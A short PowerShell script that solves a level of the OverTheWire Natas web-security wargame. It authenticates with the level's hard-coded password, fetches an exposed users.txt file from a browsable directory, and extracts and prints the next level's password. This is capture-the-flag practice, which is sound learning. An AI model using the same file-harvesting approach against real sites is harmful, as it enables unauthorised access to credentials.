<#

Script to retrieve the password of level 1-2

#>
$url = "http://natas2.natas.labs.overthewire.org "
$creds = "natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#If we curl that page, we get a hint that there is a /files/pixel.png img.
#We try to take it apart after curling it, no dice. So We look at the files dir
#We see users.txt, grab it and there is the password

$url = "http://natas2.natas.labs.overthewire.org/files/users.txt"

Invoke-WebRequest -uri $url -Method Get -Headers $headers -Outfile temp.text

get-content ./temp.text | Select-String -pattern "(\w{20,})" > res 


 $a = (get-content res).split(":")
del ./temp.text 
del res

# Write-host $a
echo "The password for   $($a[1]) is $($a[2])"


#remove-Item res


<#
The password for   natas3 is sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
#>